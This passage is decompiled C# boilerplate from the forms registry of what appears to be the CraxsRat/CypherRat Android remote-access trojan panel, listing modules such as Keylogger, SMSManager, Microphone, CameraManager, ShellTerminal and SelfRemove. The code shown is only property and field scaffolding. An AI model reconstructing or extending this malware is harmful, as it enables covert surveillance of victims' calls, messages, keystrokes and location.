					return this.m_requestapk;
				}
				set
				{
					if (value != this.m_requestapk)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<requestapk>(ref this.m_requestapk);
					}
				}
			}

			// Token: 0x17000030 RID: 48
			// (get) Token: 0x06000040 RID: 64 RVA: 0x000091AC File Offset: 0x000073AC
			// (set) Token: 0x06000077 RID: 119 RVA: 0x00009CB0 File Offset: 0x00007EB0
			public ScreenLoger ScreenLoger
			{
				get
				{
					this.m_ScreenLoger = MyProject.MyForms.Create__Instance__<ScreenLoger>(this.m_ScreenLoger);
					return this.m_ScreenLoger;
				}
				set
				{
					if (value != this.m_ScreenLoger)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ScreenLoger>(ref this.m_ScreenLoger);
					}
				}
			}

			// Token: 0x17000031 RID: 49
			// (get) Token: 0x06000041 RID: 65 RVA: 0x000091D0 File Offset: 0x000073D0
			// (set) Token: 0x06000078 RID: 120 RVA: 0x00009CE8 File Offset: 0x00007EE8
			public ScreenReader ScreenReader
			{
				get
				{
					this.m_ScreenReader = MyProject.MyForms.Create__Instance__<ScreenReader>(this.m_ScreenReader);
					return this.m_ScreenReader;
				}
				set
				{
					if (value != this.m_ScreenReader)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ScreenReader>(ref this.m_ScreenReader);
					}
				}
			}

			// Token: 0x17000032 RID: 50
			// (get) Token: 0x06000042 RID: 66 RVA: 0x000091F4 File Offset: 0x000073F4
			// (set) Token: 0x06000079 RID: 121 RVA: 0x00009D20 File Offset: 0x00007F20
			public ScreenReaderV2 ScreenReaderV2
			{
				get
				{
					this.m_ScreenReaderV2 = MyProject.MyForms.Create__Instance__<ScreenReaderV2>(this.m_ScreenReaderV2);
					return this.m_ScreenReaderV2;
				}
				set
				{
					if (value != this.m_ScreenReaderV2)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ScreenReaderV2>(ref this.m_ScreenReaderV2);
					}
				}
			}

			// Token: 0x17000033 RID: 51
			// (get) Token: 0x06000043 RID: 67 RVA: 0x00009218 File Offset: 0x00007418
			// (set) Token: 0x0600007A RID: 122 RVA: 0x00009D58 File Offset: 0x00007F58
			public ScreenShoter ScreenShoter
			{
				get
				{
					this.m_ScreenShoter = MyProject.MyForms.Create__Instance__<ScreenShoter>(this.m_ScreenShoter);
					return this.m_ScreenShoter;
				}
				set
				{
					if (value != this.m_ScreenShoter)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ScreenShoter>(ref this.m_ScreenShoter);
					}
				}
			}

			// Token: 0x17000034 RID: 52
			// (get) Token: 0x06000044 RID: 68 RVA: 0x0000923C File Offset: 0x0000743C
			// (set) Token: 0x0600007B RID: 123 RVA: 0x00009D90 File Offset: 0x00007F90
			public SelfRemove SelfRemove
			{
				get
				{
					this.m_SelfRemove = MyProject.MyForms.Create__Instance__<SelfRemove>(this.m_SelfRemove);
					return this.m_SelfRemove;
				}
				set
				{
					if (value != this.m_SelfRemove)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<SelfRemove>(ref this.m_SelfRemove);
					}
				}
			}

			// Token: 0x17000035 RID: 53
			// (get) Token: 0x06000045 RID: 69 RVA: 0x00009260 File Offset: 0x00007460
			// (set) Token: 0x0600007C RID: 124 RVA: 0x00009DC8 File Offset: 0x00007FC8
			public Settings Settings
			{
				get
				{
					this.m_Settings = MyProject.MyForms.Create__Instance__<Settings>(this.m_Settings);
					return this.m_Settings;
				}
				set
				{
					if (value != this.m_Settings)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Settings>(ref this.m_Settings);
					}
				}
			}

			// Token: 0x17000036 RID: 54
			// (get) Token: 0x06000046 RID: 70 RVA: 0x00009284 File Offset: 0x00007484
			// (set) Token: 0x0600007D RID: 125 RVA: 0x00009E00 File Offset: 0x00008000
			public ShellTerminal ShellTerminal
			{
				get
				{
					this.m_ShellTerminal = MyProject.MyForms.Create__Instance__<ShellTerminal>(this.m_ShellTerminal);
					return this.m_ShellTerminal;
				}
				set
				{
					if (value != this.m_ShellTerminal)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<ShellTerminal>(ref this.m_ShellTerminal);
					}
				}
			}

			// Token: 0x17000037 RID: 55
			// (get) Token: 0x06000047 RID: 71 RVA: 0x000092A8 File Offset: 0x000074A8
			// (set) Token: 0x0600007E RID: 126 RVA: 0x00009E38 File Offset: 0x00008038
			public smsMaker smsMaker
			{
				get
				{
					this.m_smsMaker = MyProject.MyForms.Create__Instance__<smsMaker>(this.m_smsMaker);
					return this.m_smsMaker;
				}
				set
				{
					if (value != this.m_smsMaker)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<smsMaker>(ref this.m_smsMaker);
					}
				}
			}

			// Token: 0x17000038 RID: 56
			// (get) Token: 0x06000048 RID: 72 RVA: 0x000092CC File Offset: 0x000074CC
			// (set) Token: 0x0600007F RID: 127 RVA: 0x00009E70 File Offset: 0x00008070
			public SMSManager SMSManager
			{
				get
				{
					this.m_SMSManager = MyProject.MyForms.Create__Instance__<SMSManager>(this.m_SMSManager);
					return this.m_SMSManager;
				}
				set
				{
					if (value != this.m_SMSManager)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<SMSManager>(ref this.m_SMSManager);
					}
				}
			}

			// Token: 0x17000039 RID: 57
			// (get) Token: 0x06000049 RID: 73 RVA: 0x000092F0 File Offset: 0x000074F0
			// (set) Token: 0x06000080 RID: 128 RVA: 0x00009EA8 File Offset: 0x000080A8
			public TextMessage TextMessage
			{
				get
				{
					this.m_TextMessage = MyProject.MyForms.Create__Instance__<TextMessage>(this.m_TextMessage);
					return this.m_TextMessage;
				}
				set
				{
					if (value != this.m_TextMessage)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<TextMessage>(ref this.m_TextMessage);
					}
				}
			}

			// Token: 0x1700003A RID: 58
			// (get) Token: 0x0600004A RID: 74 RVA: 0x00009314 File Offset: 0x00007514
			// (set) Token: 0x06000081 RID: 129 RVA: 0x00009EE0 File Offset: 0x000080E0
			public Upload Upload
			{
				get
				{
					this.m_Upload = MyProject.MyForms.Create__Instance__<Upload>(this.m_Upload);
					return this.m_Upload;
				}
				set
				{
					if (value != this.m_Upload)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Upload>(ref this.m_Upload);
					}
				}
			}

			// Token: 0x1700003B RID: 59
			// (get) Token: 0x0600004B RID: 75 RVA: 0x00009338 File Offset: 0x00007538
			// (set) Token: 0x06000082 RID: 130 RVA: 0x00009F18 File Offset: 0x00008118
			public WebViewMonitor WebViewMonitor
			{
				get
				{
					this.m_WebViewMonitor = MyProject.MyForms.Create__Instance__<WebViewMonitor>(this.m_WebViewMonitor);
					return this.m_WebViewMonitor;
				}
				set
				{
					if (value != this.m_WebViewMonitor)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<WebViewMonitor>(ref this.m_WebViewMonitor);
					}
				}
			}

			// Token: 0x1700003C RID: 60
			// (get) Token: 0x0600004C RID: 76 RVA: 0x0000935C File Offset: 0x0000755C
			// (set) Token: 0x06000083 RID: 131 RVA: 0x00009F50 File Offset: 0x00008150
			public Win_Users Win_Users
			{
				get
				{
					this.m_Win_Users = MyProject.MyForms.Create__Instance__<Win_Users>(this.m_Win_Users);
					return this.m_Win_Users;
				}
				set
				{
					if (value != this.m_Win_Users)
					{
						if (value != null)
						{
							throw new ArgumentException("Property can only be set to Nothing");
						}
						this.Dispose__Instance__<Win_Users>(ref this.m_Win_Users);
					}
				}
			}

			// Token: 0x04000007 RID: 7
			[ThreadStatic]
			private static Hashtable m_FormBeingCreated;

			// Token: 0x04000008 RID: 8
			[EditorBrowsable(EditorBrowsableState.Never)]
			public AccountManager m_AccountManager;

			// Token: 0x04000009 RID: 9
			[EditorBrowsable(EditorBrowsableState.Never)]
			public AddNumber m_AddNumber;

			// Token: 0x0400000A RID: 10
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Applications m_Applications;

			// Token: 0x0400000B RID: 11
			[EditorBrowsable(EditorBrowsableState.Never)]
			public AppsProperties m_AppsProperties;

			// Token: 0x0400000C RID: 12
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Auto_Clicker m_Auto_Clicker;

			// Token: 0x0400000D RID: 13
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Build m_Build;

			// Token: 0x0400000E RID: 14
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CallPhone m_CallPhone;

			// Token: 0x0400000F RID: 15
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Calls_Records m_Calls_Records;

			// Token: 0x04000010 RID: 16
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CallsManager m_CallsManager;

			// Token: 0x04000011 RID: 17
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CameraManager m_CameraManager;

			// Token: 0x04000012 RID: 18
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ClipboardManager m_ClipboardManager;

			// Token: 0x04000013 RID: 19
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Color_Box0 m_Color_Box0;

			// Token: 0x04000014 RID: 20
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ContactsManager m_ContactsManager;

			// Token: 0x04000015 RID: 21
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CraxsAbout m_CraxsAbout;

			// Token: 0x04000016 RID: 22
			[EditorBrowsable(EditorBrowsableState.Never)]
			public craxscallslog m_craxscallslog;

			// Token: 0x04000017 RID: 23
			[EditorBrowsable(EditorBrowsableState.Never)]
			public craxsnotification m_craxsnotification;

			// Token: 0x04000018 RID: 24
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CraxsSettings m_CraxsSettings;

			// Token: 0x04000019 RID: 25
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CraxsStore m_CraxsStore;

			// Token: 0x0400001A RID: 26
			[EditorBrowsable(EditorBrowsableState.Never)]
			public CypherRat m_CypherRat;

			// Token: 0x0400001B RID: 27
			[EditorBrowsable(EditorBrowsableState.Never)]
			public dia m_dia;

			// Token: 0x0400001C RID: 28
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Dialog1 m_Dialog1;

			// Token: 0x0400001D RID: 29
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Dialog2 m_Dialog2;

			// Token: 0x0400001E RID: 30
			[EditorBrowsable(EditorBrowsableState.Never)]
			public DialogPloice m_DialogPloice;

			// Token: 0x0400001F RID: 31
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Download m_Download;

			// Token: 0x04000020 RID: 32
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Editor m_Editor;

			// Token: 0x04000021 RID: 33
			[EditorBrowsable(EditorBrowsableState.Never)]
			public EditSocket m_EditSocket;

			// Token: 0x04000022 RID: 34
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Faker m_Faker;

			// Token: 0x04000023 RID: 35
			[EditorBrowsable(EditorBrowsableState.Never)]
			public FileManager m_FileManager;

			// Token: 0x04000024 RID: 36
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Icons m_Icons;

			// Token: 0x04000025 RID: 37
			[EditorBrowsable(EditorBrowsableState.Never)]
			public information m_information;

			// Token: 0x04000026 RID: 38
			[EditorBrowsable(EditorBrowsableState.Never)]
			public inp m_inp;

			// Token: 0x04000027 RID: 39
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Jector m_Jector;

			// Token: 0x04000028 RID: 40
			[EditorBrowsable(EditorBrowsableState.Never)]
			public KeyboardManager m_KeyboardManager;

			// Token: 0x04000029 RID: 41
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Keylogger m_Keylogger;

			// Token: 0x0400002A RID: 42
			[EditorBrowsable(EditorBrowsableState.Never)]
			public LanguageSelector m_LanguageSelector;

			// Token: 0x0400002B RID: 43
			[EditorBrowsable(EditorBrowsableState.Never)]
			public LocationManager m_LocationManager;

			// Token: 0x0400002C RID: 44
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Microphone m_Microphone;

			// Token: 0x0400002D RID: 45
			[EditorBrowsable(EditorBrowsableState.Never)]
			public nonetform m_nonetform;

			// Token: 0x0400002E RID: 46
			[EditorBrowsable(EditorBrowsableState.Never)]
			public PermissionsManager m_PermissionsManager;

			// Token: 0x0400002F RID: 47
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Ports m_Ports;

			// Token: 0x04000030 RID: 48
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Report m_Report;

			// Token: 0x04000031 RID: 49
			[EditorBrowsable(EditorBrowsableState.Never)]
			public requestapk m_requestapk;

			// Token: 0x04000032 RID: 50
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ScreenLoger m_ScreenLoger;

			// Token: 0x04000033 RID: 51
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ScreenReader m_ScreenReader;

			// Token: 0x04000034 RID: 52
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ScreenReaderV2 m_ScreenReaderV2;

			// Token: 0x04000035 RID: 53
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ScreenShoter m_ScreenShoter;

			// Token: 0x04000036 RID: 54
			[EditorBrowsable(EditorBrowsableState.Never)]
			public SelfRemove m_SelfRemove;

			// Token: 0x04000037 RID: 55
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Settings m_Settings;

			// Token: 0x04000038 RID: 56
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ShellTerminal m_ShellTerminal;

			// Token: 0x04000039 RID: 57
			[EditorBrowsable(EditorBrowsableState.Never)]
			public smsMaker m_smsMaker;

			// Token: 0x0400003A RID: 58
			[EditorBrowsable(EditorBrowsableState.Never)]
			public SMSManager m_SMSManager;

			// Token: 0x0400003B RID: 59
			[EditorBrowsable(EditorBrowsableState.Never)]
			public TextMessage m_TextMessage;

			// Token: 0x0400003C RID: 60
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Upload m_Upload;

			// Token: 0x0400003D RID: 61
			[EditorBrowsable(EditorBrowsableState.Never)]
			public WebViewMonitor m_WebViewMonitor;

			// Token: 0x0400003E RID: 62
			[EditorBrowsable(EditorBrowsableState.Never)]
			public Win_Users m_Win_Users;
		}

		// Token: 0x02000007 RID: 7
		[MyGroupCollection("System.Web.Services.Protocols.SoapHttpClientProtocol", "Create__Instance__", "Dispose__Instance__", "")]
		[EditorBrowsable(EditorBrowsableState.Never)]
		internal sealed class MyWebServices
		{
			// Token: 0x06000084 RID: 132 RVA: 0x00008A5C File Offset: 0x00006C5C
			[EditorBrowsable(EditorBrowsableState.Never)]
			public MyWebServices()
			{
			}

			// Token: 0x06000085 RID: 133 RVA: 0x000022DE File Offset: 0x000004DE
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override bool Equals(object obj)
			{
				return base.Equals(RuntimeHelpers.GetObjectValue(obj));
			}

			// Token: 0x06000086 RID: 134 RVA: 0x00008B78 File Offset: 0x00006D78
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override int GetHashCode()
			{
				return base.GetHashCode();
			}

			// Token: 0x06000087 RID: 135 RVA: 0x00009F88 File Offset: 0x00008188
			[EditorBrowsable(EditorBrowsableState.Never)]
			internal new Type GetType()
			{
				return typeof(MyProject.MyWebServices);
			}

			// Token: 0x06000088 RID: 136 RVA: 0x00009FA4 File Offset: 0x000081A4
			[EditorBrowsable(EditorBrowsableState.Never)]
			public override string ToString()
			{
				return base.ToString();
			}

			// Token: 0x06000089 RID: 137 RVA: 0x00009FBC File Offset: 0x000081BC
			private static T Create__Instance__<T>(T Instance) where T : new()
			{
				T result;
				if (Instance == null)
				{
					result = Activator.CreateInstance<T>();
				}
				else
				{
					result = Instance;
				}
				return result;
			}

			// Token: 0x0600008A RID: 138 RVA: 0x000022EC File Offset: 0x000004EC
			private void Dispose__Instance__<T>(ref T instance)
			{
				instance = default(T);
			}
		}

		// Token: 0x02000008 RID: 8
		[EditorBrowsable(EditorBrowsableState.Never)]
		[ComVisible(false)]
		internal sealed class ThreadSafeObjectProvider<T> where T : new()
		{
			// Token: 0x0600008B RID: 139 RVA: 0x00008A5C File Offset: 0x00006C5C
			[EditorBrowsable(EditorBrowsableState.Never)]
			public ThreadSafeObjectProvider()
			{
			}

			// Token: 0x1700003D RID: 61
			// (get) Token: 0x0600008C RID: 140 RVA: 0x00009FE0 File Offset: 0x000081E0
			internal T GetInstance
			{
				get
				{
					if (MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue == null)
					{
						MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue = Activator.CreateInstance<T>();
					}
					return MyProject.ThreadSafeObjectProvider<T>.m_ThreadStaticValue;
				}
			}

			// Token: 0x0600008D RID: 141 RVA: 0x000022F5 File Offset: 0x000004F5
			internal static bool smethod_0()
			{
				return MyProject.ThreadSafeObjectProvider<T>.object_0 == null;
			}

			// Token: 0x0600008E RID: 142 RVA: 0x000022FF File Offset: 0x000004FF
			internal static object smethod_1()
			{
				return MyProject.ThreadSafeObjectProvider<T>.object_0;
			}

			// Token: 0x0400003F RID: 63
			[ThreadStatic]
			[CompilerGenerated]
			private static T m_ThreadStaticValue;

			// Token: 0x04000040 RID: 64
			internal static object object_0;
		}
	}
}
